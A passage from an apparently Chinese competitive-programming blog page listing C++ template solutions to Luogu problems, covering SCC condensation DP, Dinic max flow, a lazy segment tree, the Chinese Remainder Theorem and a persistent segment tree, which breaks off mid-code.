&lt;= n; ++i) &#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">auto</span> val : G[i]) &#123;</span><br><span class="line">			<span class="keyword">if</span> (col[val] != col[i]) &#123;</span><br><span class="line">				Gscc[col[i]].<span class="built_in">push_back</span>(col[val]);</span><br><span class="line">				++sccdeg[col[val]];</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">register</span> <span class="type">int</span> i = <span class="number">1</span>; i &lt;= scccnt; ++i) &#123;</span><br><span class="line">		<span class="keyword">if</span> (!sccdeg[i]) que[++head] = i;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">while</span> (tail &lt; head) &#123;</span><br><span class="line">		<span class="type">int</span> now = que[++tail];</span><br><span class="line">		sccval[now] += dp[now];</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">auto</span> val : Gscc[now]) &#123;</span><br><span class="line">			dp[val] = <span class="built_in">max</span>(dp[val], sccval[now]);</span><br><span class="line">			sccdeg[val]--;</span><br><span class="line">			<span class="keyword">if</span> (!sccdeg[val]) que[++head] = val;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= scccnt; ++i) &#123;</span><br><span class="line">		ans = <span class="built_in">max</span>(sccval[i], ans);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">print</span>(ans);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="网络最大流"><a href="#网络最大流" class="headerlink" title="网络最大流"></a>网络最大流</h1><p><strong>洛谷P3376</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cctype&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">read</span><span class="params">(T &amp;x)</span> </span>&#123;</span><br><span class="line">	T f = <span class="number">1</span>, ch = <span class="built_in">getchar</span>(); x = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span> (!<span class="built_in">isdigit</span>(ch)) &#123; f = ch == <span class="string">&#x27;-&#x27;</span> ? <span class="number">-1</span> : <span class="number">1</span>, ch = <span class="built_in">getchar</span>(); &#125;</span><br><span class="line">	<span class="keyword">while</span> (<span class="built_in">isdigit</span>(ch)) &#123; x = x * <span class="number">10</span> + ch - <span class="number">48</span>, ch = <span class="built_in">getchar</span>(); &#125;</span><br><span class="line">	x *= f;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="function"><span class="type">void</span> <span class="title">print</span><span class="params">(T x)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (x &lt; <span class="number">0</span>) &#123; <span class="built_in">putchar</span>(<span class="string">&#x27;-&#x27;</span>), x = -x; &#125;</span><br><span class="line">	<span class="keyword">if</span> (x &gt; <span class="number">9</span>) &#123; <span class="built_in">print</span>( x / <span class="number">10</span>); &#125;</span><br><span class="line">	<span class="built_in">putchar</span>(x % <span class="number">10</span> + <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T,<span class="keyword">typename</span>... Args&gt; <span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">read</span><span class="params">(T &amp;t,Args&amp;... args)</span> </span>&#123;</span><br><span class="line">	<span class="built_in">read</span>(t);<span class="built_in">read</span>(args...);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">long</span> <span class="type">long</span> INF = <span class="number">7435234564764323</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">209</span>, M = <span class="number">5009</span>;</span><br><span class="line"><span class="type">int</span> n, m, s, t, head[N], pre[N], level[N], que[N], cnt = <span class="number">1</span>;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> ans;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">EDGE</span>&#123;<span class="type">int</span> to, nex;<span class="type">long</span> <span class="type">long</span> flow;&#125;edge[M &lt;&lt; <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">long</span> <span class="type">long</span> <span class="title">dfs</span><span class="params">(<span class="type">int</span> x, <span class="type">long</span> <span class="type">long</span> rest)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (x == t) <span class="keyword">return</span> rest;</span><br><span class="line">	<span class="keyword">register</span> <span class="type">long</span> <span class="type">long</span> flow = <span class="number">0</span>, f = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> &amp;i = pre[x]; i; i = edge[i].nex) &#123;</span><br><span class="line">		<span class="keyword">if</span> (level[x] + <span class="number">1</span> == level[edge[i].to] &amp;&amp; edge[i].flow) &#123;</span><br><span class="line">			f = <span class="built_in">dfs</span>(edge[i].to, <span class="built_in">min</span>(rest - flow, edge[i].flow));</span><br><span class="line">			flow += f, edge[i].flow -= f, edge[i ^ <span class="number">1</span>].flow += f;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (!flow) level[x] = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">return</span> flow;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">bfs</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="built_in">memset</span>(level, <span class="number">0</span>, <span class="built_in">sizeof</span>(level));</span><br><span class="line">	<span class="keyword">register</span> <span class="type">int</span> H = <span class="number">1</span>, T = <span class="number">0</span>; que[<span class="number">1</span>] = s, level[s] = <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">while</span> (T &lt; H) &#123;</span><br><span class="line">		<span class="type">int</span> now = que[++T];</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">register</span> <span class="type">int</span> i = head[now]; i; i = edge[i].nex) &#123;</span><br><span class="line">			<span class="keyword">if</span> (!level[edge[i].to] &amp;&amp; edge[i].flow) &#123;</span><br><span class="line">				level[edge[i].to] = level[now] + <span class="number">1</span>;</span><br><span class="line">				que[++H] = edge[i].to;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> level[t];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dinic</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">while</span> (<span class="built_in">bfs</span>()) &#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">register</span> <span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; ++i) pre[i] = head[i];</span><br><span class="line">		ans += <span class="built_in">dfs</span>(s, INF);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">signed</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="built_in">read</span>(n, m, s, t);</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">register</span> <span class="type">int</span> i = <span class="number">1</span>, u = <span class="number">0</span>, v = <span class="number">0</span>, w = <span class="number">0</span>; i &lt;= m; ++i) &#123;</span><br><span class="line">		<span class="built_in">read</span>(u, v, w);</span><br><span class="line">		edge[++cnt] = (EDGE)&#123;v, head[u], w&#125;, head[u] = cnt;</span><br><span class="line">		edge[++cnt] = (EDGE)&#123;u, head[v], <span class="number">0</span>&#125;, head[v] = cnt;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">dinic</span>();</span><br><span class="line">	<span class="built_in">print</span>(ans);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="线段树"><a href="#线段树" class="headerlink" title="线段树"></a>线段树</h1><p><strong>洛谷P3372</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cctype&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">read</span><span class="params">(T &amp;x)</span> </span>&#123;</span><br><span class="line">	T f = <span class="number">1</span>, ch = <span class="built_in">getchar</span>(); x = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span> (!<span class="built_in">isdigit</span>(ch)) &#123; f = ch == <span class="string">&#x27;-&#x27;</span> ? <span class="number">-1</span> : <span class="number">1</span>, ch = <span class="built_in">getchar</span>(); &#125;</span><br><span class="line">	<span class="keyword">while</span> (<span class="built_in">isdigit</span>(ch)) &#123; x = x * <span class="number">10</span> + ch - <span class="number">48</span>, ch = <span class="built_in">getchar</span>(); &#125;</span><br><span class="line">	x *= f;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="function"><span class="type">void</span> <span class="title">print</span><span class="params">(T x)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (x &lt; <span class="number">0</span>) &#123; <span class="built_in">putchar</span>(<span class="string">&#x27;-&#x27;</span>), x = -x; &#125;</span><br><span class="line">	<span class="keyword">if</span> (x &gt; <span class="number">9</span>) &#123; <span class="built_in">print</span>( x / <span class="number">10</span>); &#125;</span><br><span class="line">	<span class="built_in">putchar</span>(x % <span class="number">10</span> + <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T,<span class="keyword">typename</span>... Args&gt; <span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">read</span><span class="params">(T &amp;t,Args&amp;... args)</span> </span>&#123;</span><br><span class="line">	<span class="built_in">read</span>(t);<span class="built_in">read</span>(args...);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">1e5</span> + <span class="number">9</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">SEGMENTTREE</span>&#123;</span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">        <span class="keyword">struct</span> <span class="title class_">NODE</span>&#123;</span><br><span class="line">            <span class="type">long</span> <span class="type">long</span> val, lz;</span><br><span class="line">            NODE *lson, *rson;</span><br><span class="line">        &#125;tree[N &lt;&lt; <span class="number">1</span>], *root;</span><br><span class="line">        <span class="type">int</span> cnt, n;</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">build</span><span class="params">(NODE *now, <span class="type">int</span> l, <span class="type">int</span> r, <span class="type">long</span> <span class="type">long</span> val[])</span> </span>&#123;</span><br><span class="line">            now-&gt;lz = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">if</span> (l == r) &#123;</span><br><span class="line">                now-&gt;val = val[l];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="type">int</span> mid = (l + r) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">                now-&gt;lson = &amp;tree[++cnt], now-&gt;rson = &amp;tree[++cnt];</span><br><span class="line">                <span class="built_in">build</span>(now-&gt;lson, l, mid, val);</span><br><span class="line">                <span class="built_in">build</span>(now-&gt;rson, mid + <span class="number">1</span>, r, val);</span><br><span class="line">                now-&gt;val = now-&gt;lson-&gt;val + now-&gt;rson-&gt;val;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">pushdown</span><span class="params">(NODE *now, <span class="type">int</span> l, <span class="type">int</span> r, <span class="type">int</span> mid)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (!now-&gt;lz) <span class="keyword">return</span>;</span><br><span class="line">            now-&gt;lson-&gt;val += now-&gt;lz * (mid - l + <span class="number">1</span>);</span><br><span class="line">            now-&gt;rson-&gt;val += now-&gt;lz * (r - mid);</span><br><span class="line">            now-&gt;lson-&gt;lz += now-&gt;lz;</span><br><span class="line">            now-&gt;rson-&gt;lz += now-&gt;lz;</span><br><span class="line">            now-&gt;lz = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">update</span><span class="params">(NODE *now, <span class="type">int</span> l, <span class="type">int</span> r, <span class="type">int</span> L, <span class="type">int</span> R, <span class="type">long</span> <span class="type">long</span> val)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (L &lt;= l &amp;&amp; r &lt;= R) &#123;</span><br><span class="line">                now-&gt;val += val * (r - l + <span class="number">1</span>);</span><br><span class="line">                now-&gt;lz += val;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="type">int</span> mid = (l + r) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">                <span class="built_in">pushdown</span>(now, l, r, mid);</span><br><span class="line">                <span class="keyword">if</span> (L &lt;= mid) <span class="built_in">update</span>(now-&gt;lson, l, mid, L, R, val);</span><br><span class="line">                <span class="keyword">if</span> (R &gt; mid) <span class="built_in">update</span>(now-&gt;rson, mid + <span class="number">1</span>, r, L, R, val);</span><br><span class="line">                now-&gt;val = now-&gt;lson-&gt;val + now-&gt;rson-&gt;val;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="type">long</span> <span class="type">long</span> <span class="title">query</span><span class="params">(NODE *now, <span class="type">int</span> l, <span class="type">int</span> r, <span class="type">int</span> L, <span class="type">int</span> R)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (L &lt;= l &amp;&amp; r &lt;= R) &#123;</span><br><span class="line">                <span class="keyword">return</span> now-&gt;val;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="type">int</span> mid = (l + r) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">                <span class="built_in">pushdown</span>(now, l, r, mid);</span><br><span class="line">                <span class="type">long</span> <span class="type">long</span> res = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">if</span> (L &lt;= mid) res += <span class="built_in">query</span>(now-&gt;lson, l, mid, L, R);</span><br><span class="line">                <span class="keyword">if</span> (R &gt; mid) res += <span class="built_in">query</span>(now-&gt;rson, mid + <span class="number">1</span>, r, L, R);</span><br><span class="line">                <span class="keyword">return</span> res;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">Init</span><span class="params">(<span class="type">int</span> size, <span class="type">long</span> <span class="type">long</span> val[])</span> </span>&#123;</span><br><span class="line">            n = size;</span><br><span class="line">            cnt = <span class="number">0</span>;</span><br><span class="line">            root = &amp;tree[++cnt];</span><br><span class="line">            <span class="built_in">build</span>(root, <span class="number">1</span>, n, val);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="type">long</span> <span class="type">long</span> <span class="title">ask</span><span class="params">(<span class="type">int</span> l, <span class="type">int</span> r)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">query</span>(root, <span class="number">1</span>, n, l, r);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">modify</span><span class="params">(<span class="type">int</span> l, <span class="type">int</span> r, <span class="type">long</span> <span class="type">long</span> val)</span> </span>&#123;</span><br><span class="line">            <span class="built_in">update</span>(root, <span class="number">1</span>, n, l, r, val);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;S;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> val[N];</span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">signed</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">read</span>(n, m);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">register</span> <span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; ++i) <span class="built_in">read</span>(val[i]);</span><br><span class="line">    S.<span class="built_in">Init</span>(n, val);</span><br><span class="line">    <span class="keyword">register</span> <span class="type">int</span> x = <span class="number">0</span>, y = <span class="number">0</span>, opt = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">register</span> <span class="type">long</span> <span class="type">long</span> k = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (m--) &#123;</span><br><span class="line">        <span class="built_in">read</span>(opt);</span><br><span class="line">        <span class="keyword">if</span> (opt == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="built_in">read</span>(x, y, k);</span><br><span class="line">            S.<span class="built_in">modify</span>(x, y, k);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">read</span>(x, y);</span><br><span class="line">            <span class="built_in">print</span>(S.<span class="built_in">ask</span>(x, y)), <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="中国剩余定理（CRT）"><a href="#中国剩余定理（CRT）" class="headerlink" title="中国剩余定理（CRT）"></a>中国剩余定理（CRT）</h1><p><strong>洛谷P1495</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cctype&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">read</span><span class="params">(T &amp;x)</span> </span>&#123;</span><br><span class="line">	T f = <span class="number">1</span>, ch = <span class="built_in">getchar</span>(); x = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span> (!<span class="built_in">isdigit</span>(ch)) &#123; f = ch == <span class="string">&#x27;-&#x27;</span> ? <span class="number">-1</span> : <span class="number">1</span>, ch = <span class="built_in">getchar</span>(); &#125;</span><br><span class="line">	<span class="keyword">while</span> (<span class="built_in">isdigit</span>(ch)) &#123; x = x * <span class="number">10</span> + ch - <span class="number">48</span>, ch = <span class="built_in">getchar</span>(); &#125;</span><br><span class="line">	x *= f;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="function"><span class="type">void</span> <span class="title">print</span><span class="params">(T x)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (x &lt; <span class="number">0</span>) &#123; <span class="built_in">putchar</span>(<span class="string">&#x27;-&#x27;</span>), x = -x; &#125;</span><br><span class="line">	<span class="keyword">if</span> (x &gt; <span class="number">9</span>) &#123; <span class="built_in">print</span>( x / <span class="number">10</span>); &#125;</span><br><span class="line">	<span class="built_in">putchar</span>(x % <span class="number">10</span> + <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T,<span class="keyword">typename</span>... Args&gt; <span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">read</span><span class="params">(T &amp;t,Args&amp;... args)</span> </span>&#123;</span><br><span class="line">	<span class="built_in">read</span>(t);<span class="built_in">read</span>(args...);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">long</span> <span class="type">long</span> <span class="title">exgcd</span><span class="params">(<span class="type">long</span> <span class="type">long</span> a, <span class="type">long</span> <span class="type">long</span> b, <span class="type">long</span> <span class="type">long</span> &amp;x, <span class="type">long</span> <span class="type">long</span> &amp;y)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!b) &#123;</span><br><span class="line">        x = <span class="number">1</span>, y = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> a;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> t = <span class="built_in">exgcd</span>(b, a % b, x, y), k = x;</span><br><span class="line">    x = y;</span><br><span class="line">    y = k - a / b * y;</span><br><span class="line">    <span class="keyword">return</span> t;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> a[<span class="number">11</span>], b[<span class="number">11</span>], inv[<span class="number">11</span>], M = <span class="number">1</span>, ans;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">signed</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">read</span>(n);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">register</span> <span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; ++i) &#123;</span><br><span class="line">        <span class="built_in">read</span>(b[i], a[i]);</span><br><span class="line">        M *= b[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">register</span> <span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; ++i) &#123;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> m = M / b[i], x = <span class="number">0</span>, y = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">exgcd</span>(m, b[i], x, y);</span><br><span class="line">        ans = (ans + a[i] * m % M * x) % M;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">print</span>((ans + M) % M);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="主席树"><a href="#主席树" class="headerlink" title="主席树"></a>主席树</h1><p><strong>洛谷P3834</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cctype&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">read</span><span class="params">(T &amp;x)</span> </span>&#123;</span><br><span class="line">	T f = <span class="number">1</span>, ch = <span class="built_in">getchar</span>(); x = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span> (!<span class="built_in">isdigit</span>(ch)) &#123; f = ch == <span class="string">&#x27;-&#x27;</span> ? <span class="number">-1</span> : <span class="number">1</span>, ch = <span class="built_in">getchar</span>(); &#125;</span><br><span class="line">	<span class="keyword">while</span> (<span class="built_in">isdigit</span>(ch)) &#123; x = x * <span class="number">10</span> + ch - <span class="number">48</span>, ch = <span class="built_in">getchar</span>(); &#125;</span><br><span class="line">	x *= f;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="function"><span class="type">void</span> <span class="title">print</span><span class="params">(T x)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (x &lt; <span class="number">0</span>) &#123; <span class="built_in">putchar</span>(<span class="string">&#x27;-&#x27;</span>), x = -x; &#125;</span><br><span class="line">	<span class="keyword">if</span> (x &gt; <span class="number">9</span>) &#123; <span class="built_in">print</span>( x / <span class="number">10</span>); &#125;</span><br><span class="line">	<span class="built_in">putchar</span>(x % <span class="number">10</span> + <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T,<span class="keyword">typename</span>... Args&gt; <span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">read</span><span class="params">(T &amp;t,Args&amp;... args)</span> </span>&#123;</span><br><span class="line">	<span class="built_in">read</span>(t);<span class="built_in">read</span>(args...);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">2e5</span> + <span class="number">9</span>;</span><br><span class="line"><span class="type">int</span> n, m, tot, disc[N], num[N];</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">NODE</span> &#123;</span><br><span class="line">    NODE *lson, *rson;</span><br><span class="line">    <span class="type">int</span> val;</span><br><span class="line">&#125;tree[N &lt;&lt; <span class="number">5</span>], *his[N];</span><br><span class="line"><span class="type">int</span> cnt;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">build</span><span class="params">(NODE *now, <span class="type">int</span> l, <span class="type">int</span> r)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (l != r) &#123;</span><br><span class="line">        <span class="type">int</span> mid = (l + r) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">        now-&gt;lson = &amp;tree[++cnt], now-&gt;rson = &amp;tree[++cnt];</span><br><span class="line">        <span class="built_in">build</span>(now-&gt;lson, l, mid);</span><br><span class="line">        <span class="built_in">build</span>(now-&gt;rson, mid + <span class="number">1</span>, r);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">insert</span><span class="params">(NODE *last, NODE *now, <span class="type">int</span> l, <span class="type">int</span> r, <span class="type">int</span> pos, <span class="type">int</span> val)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (l == r) &#123;</span><br><span class="line">        now-&gt;val = last-&gt;val + val;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">int</span> mid = (l + r) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (pos &lt;= mid) &#123;</span><br><span class="line">            now-&gt;rson = last-&gt;rson;</span><br><span class="line">            now-&gt;lson = &amp;tree[++cnt];</span><br><span class="line">            <span class="built_in">insert</span>(last-&gt;lson, now-&gt;lson, l, mid, pos, val);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            now-&gt;lson = last-&gt;lson;</span><br><span class="line">            now-&gt;rson = &amp;tree[++cnt];</span><br><span class="line">            <span class="built_in">insert</span>(last-&gt;rson, now-&gt;rson, mid + <span class="number">1</span>, r, pos, val);</span><br><span class="line">        &#125;</span><br><span class="line">        now-&gt;val = now-&gt;lson-&gt;val + now-&gt;rson-&gt;val;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">ask</span><span class="params">(NODE *L, NODE *R, <span class="type">int</span> l,<span class="type">int</span> r, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (l == r) <span class="keyword">return</span> l;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">int</span> mid = (l + r) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (R-&gt;lson-&gt;val - 